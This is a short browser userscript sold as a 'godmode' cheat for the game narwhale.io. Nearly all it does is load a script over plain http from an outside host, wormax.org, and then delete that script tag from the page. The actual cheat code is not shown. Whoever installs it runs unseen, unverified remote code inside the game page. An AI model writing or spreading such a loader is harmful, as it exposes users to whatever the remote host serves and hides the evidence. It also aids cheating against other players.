// ==UserScript==
// @name         NARWHALE.IO MOD HACK CHEAT GODMODE
// @namespace    NARWHALE.IO MODS HACKS CHEATS
// @version      1.11
// @description  NARWHALE.io Mod 1.11
// @author       slithere.com
// @match        http://narwhale.io/*
// @require      http://code.jquery.com/jquery-1.12.4.min.js
// @grant        none
// @connect      narwhale.io
// ==/UserScript==

var s = document.createElement('script');
s.src = 'https://code.jquery.com/jquery-1.12.3.min.js';
s.onload = function() {
	document.head.innerHTML += '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">';
	var s = document.createElement('script');
	s.src = 'http://wormax.org/chrome3kafa/narwhaleio.js';
	s.onload = function() {
		this.parentNode.removeChild(this);
	};
	(document.head || document.documentElement).appendChild(s);
};
(document.head || document.documentElement).appendChild(s);